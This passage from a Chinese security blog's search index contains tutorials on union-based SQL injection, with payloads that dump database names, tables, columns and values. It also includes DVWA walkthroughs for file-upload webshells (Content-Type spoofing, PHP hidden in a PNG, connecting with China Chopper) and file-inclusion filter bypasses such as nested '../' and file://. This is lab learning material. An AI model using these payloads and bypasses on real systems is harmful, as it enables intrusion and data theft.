<h2 id="执行注入"><a href="#执行注入" class="headerlink" title="执行注入"></a>执行注入</h2><h3 id="SQL注释"><a href="#SQL注释" class="headerlink" title="SQL注释"></a>SQL注释</h3><p>SQL 注入过程中注释符号有以下几种表达方式：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>SQL注入过程中注释符号的作用是把后面不需要的语句注释掉，以保证SQL命令的完整性。在注入的查询语句后跟注释可以屏蔽掉原本正常查询语句的部分内容。</p>
<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><blockquote>
<p>有信息回显才能用</p>
</blockquote>
<h4 id="1-爆列"><a href="#1-爆列" class="headerlink" title="1. 爆列"></a>1. 爆列</h4><p>使用 <code>order by</code> 语句测试当前表有多少列， <code>order by</code> 语句的作用是按照某一列进行排序，在 MySQL 数据库中我们可以使用数字来代替对应列的列名，如果数据库中没有对应的列，就会报错。所以我们可以通过依次增加数字，直到报错，然后报错前的数字就是表的列数。例如：</p>
<p>[order by 1]-&gt;[order by 2]-&gt;[order by 3]-&gt;[order by 4]-&gt;数据库报错</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304101425795.png" title alt data-align="center">

<h4 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2. 爆数据库"></a>2. 爆数据库</h4><p>使用 <code>database()</code> 可以获取当前使用的数据库名称</p>
<p>使用联合查询语句进行查询： </p>
<p><code>union select 1,database(),3 #</code> </p>
<p>回显信息可以看到Login name已经被替换为了数据库的名称。</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304101433026.png" title alt data-align="center">

<h4 id="4-爆表"><a href="#4-爆表" class="headerlink" title="4. 爆表"></a>4. 爆表</h4><p>利用<strong>前提</strong>中的方法，使用联合查询语句： </p>
<p><code>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() #</code> </p>
<p>可以查到数据库中的所有表，其中 <code>group_concat()</code> 的意思为将查询到的所有table_name聚合为一条内容，从而解决某些网站只能回显一行的情况。</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304101441978.png" title alt data-align="center">

<h4 id="5-爆列"><a href="#5-爆列" class="headerlink" title="5. 爆列"></a>5. 爆列</h4><p>对于可能有敏感信息的表可以使用联合查询语句：</p>
<p><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &#39;&lt;table&gt;&#39;</code> </p>
<p>可以查到 <code>&lt;table&gt;</code> 表中的所有列。</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304101447487.png" title alt data-align="center">

<h4 id="6-爆值"><a href="#6-爆值" class="headerlink" title="6. 爆值"></a>6. 爆值</h4><p>现在已经得到了数据库名，表名，列。接下来就是需要获取最重要的值，依然使用联合查询语句：</p>
<p><code>union select 1,group_concat(&lt;column1&gt;,&lt;column2&gt;),3 from &lt;table&gt; #</code> </p>
<p><code>&lt;column1&gt;,&lt;column2&gt;</code> 表示想要获取数据的列。</p>
<p><code>&lt;table&gt;</code> 表示想要获取数据的表。<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/202304101453479.png" title alt data-align="center"></p>
<h4 id="剩余内容正在施工…"><a href="#剩余内容正在施工…" class="headerlink" title="剩余内容正在施工…"></a>剩余内容正在施工…</h4>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>OWASP-TOP10</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞实战之DVWA</title>
    <url>/2023/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8BDVWA/</url>
    <content><![CDATA[<h1 id="File-Uploads-Low"><a href="#File-Uploads-Low" class="headerlink" title="File Uploads(Low)"></a>File Uploads(Low)</h1><h2 id="分析及测试"><a href="#分析及测试" class="headerlink" title="分析及测试"></a>分析及测试</h2><p>直接尝试上传一句话马上去</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251646216.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251647286.png"></p>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>上传成功，并且有路径回显。直接根据回显的路径使用菜刀连接</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251648155.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251649035.png"></p>
<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251654935.png"></p>
<p>这里没有对上传的文件类型做限制，单独对文件是否能移动到上传文件夹做了判断</p>
<h1 id="File-Uploads-Medium"><a href="#File-Uploads-Medium" class="headerlink" title="File Uploads(Medium)"></a>File Uploads(Medium)</h1><h2 id="分析及测试-1"><a href="#分析及测试-1" class="headerlink" title="分析及测试"></a>分析及测试</h2><p>还是先上传php，发现上传失败，提示只能上传jpeg或png</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251715806.png"></p>
<p>burp抓下包看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251716466.png"></p>
<p>尝试改请求包中的content-type骗过判断，让它认为我的php为图片（不在repeater里试了，直接改）</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251718899.png"></p>
<h2 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h2><p>上传成功，使用菜刀连接：连接成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251648155.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251649035.png"></p>
<h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><p>这里看到对于图片的类型（type）做了判断，是否为image，且大小是否小于100000，是则直接上传</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251721961.png"></p>
<h1 id="File-Uploads-High"><a href="#File-Uploads-High" class="headerlink" title="File Uploads(High)"></a>File Uploads(High)</h1><h2 id="分析及测试-2"><a href="#分析及测试-2" class="headerlink" title="分析及测试"></a>分析及测试</h2><p>直接用medium的方法改包看看，结果发现这个方法行不通了</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251715806.png"></p>
<p>这时候想到既然php没法上传，那就真上传一个图片，把php代码想办法塞进图片里，再使用伪协议构造一个payload，只要图片内容能被解析出来就能执行图片中的一句话马</p>
<h2 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251733415.png"></p>
<p>以记事本方式打开demo.png，可以看到一句话马被嵌到了图片的最后一行</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251737254.png"></p>
<p>上传demo.png，可以被正常上传上去</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251648155.png"></p>
<p>尝试检查前端源代码，发现在36行处出现了可能出现文件包含的页面，根据这个路径构造payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251746420.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251754183.png"></p>
<p>菜刀也能连接到</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251649035.png"></p>
<h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><p>使用了strrpos函数，判断文件名的后缀是否为jpg，png和jpeg，getimagesize函数会读取图片的文件头，包括图片宽高等信息，如果没有这些信息则报错</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251740396.png"></p>
<h1 id="File-Uploads-Impossible"><a href="#File-Uploads-Impossible" class="headerlink" title="File Uploads(Impossible)"></a>File Uploads(Impossible)</h1><h2 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h2><p>除了以上所有等级的过滤，还加入了imagecreatefromjpeg函数和imagejpeg函数，imagecreatefromjpeg函数用于由文件或 URL 创建一个新图象，在这里也就是通过上传的图片创建一个新图像，再使用imagejpeg函数将imagecreatefromjpeg创建的图像变为jpeg图片，最后删除原来我们上传的图片，这样保证了图片中插入的恶意代码被过滤掉</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304251802499.png"></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞实战之DVWA</title>
    <url>/2023/04/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8BDVWA/</url>
    <content><![CDATA[<h1 id="File-Inclusion-Low"><a href="#File-Inclusion-Low" class="headerlink" title="File Inclusion - Low"></a>File Inclusion - Low</h1><h2 id="分析及测试"><a href="#分析及测试" class="headerlink" title="分析及测试"></a>分析及测试</h2><p>先看看页面内容：有3个php页面，对应page值</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304212246082.png"></p>
<p>先看看能否修改page值访问到本机的文件（拿Windows宿主机试了下，linux也可以尝试使用本地的文件），发现可行</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304212252094.png"></p>
<p>那么接下来就可以尝试访问到服务器的文件，发现也可以直接访问到，证明既没有设置白名单也没有参数过滤</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304212255931.png"></p>
<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304212257210.png"></p>
<p>只有简单的一行代码，没有任何防御手段</p>
<h1 id="File-Inclusion-Medium"><a href="#File-Inclusion-Medium" class="headerlink" title="File Inclusion - Medium"></a>File Inclusion - Medium</h1><h2 id="分析及测试-1"><a href="#分析及测试-1" class="headerlink" title="分析及测试"></a>分析及测试</h2><p>直接如法炮制访问服务器文件，发现行不通了</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304212300759.png"></p>
<p>再尝试访问本机文件，结果可以访问到，说明可能对 <code>../</code> 等字符做了限制</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304212302466.png"></p>
<p>结合给到的WarningNo such file or directory in &#x2F;var&#x2F;www&#x2F;html&#x2F;DWVA&#x2F;vulnerabilities&#x2F;fi&#x2F;index.php可以尝试直接使用绝对路径来绕过参数限制</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304212356538.png"></p>
<h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304212356932.png"></p>
<p>果然是对 <code>../</code> , <code>..\\\</code> 等进行了限制，但是str_replace函数并不靠谱，可以使用绝对路径代替。或将限制的字符进行拼接，因为..&#x2F;等会被替换为空，那么在 <code>../</code> 中间再拼接一个 <code>../</code> ：.. ..&#x2F; &#x2F; , 由于中间的 <code>../</code> 会被替换为空，那么左右两边的又会变成一个完整的 <code>../</code>，这样就可以正常访问到。</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304220003917.png"></p>
<h1 id="File-Inclusion-High"><a href="#File-Inclusion-High" class="headerlink" title="File Inclusion - High"></a>File Inclusion - High</h1><h2 id="分析及测试-2"><a href="#分析及测试-2" class="headerlink" title="分析及测试"></a>分析及测试</h2><p>使用之前的方法，发现都不行，报错信息甚至做了自定义，这样就无法通过报错获取到有用的信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304220009838.png"></p>
<p>猜测可能做了更严格的限制，可能对参数的格式做了限制，尝试用file:&#x2F;&#x2F;协议类构造一个payload进行文件读取，加一个 <code>file://</code>，发现可以正常访问到。</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304220017331.png"></p>
<h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304220017222.png"></p>
<p>这里使用了fnmatch函数对page参数做了限制，开头必须为file。至于为什么能猜到要加file:&#x2F;&#x2F;，原因是相对路径不行，字符拼接不行，用过绝对路径后还不行就大致能确定不是字符限制的问题，问题可能出在参数格式之类的限制上。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>梯度下降</title>
    <url>/2022/10/11/%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>机器深度学习Deeplearning.AI</category>
      </categories>
  </entry>
</search>
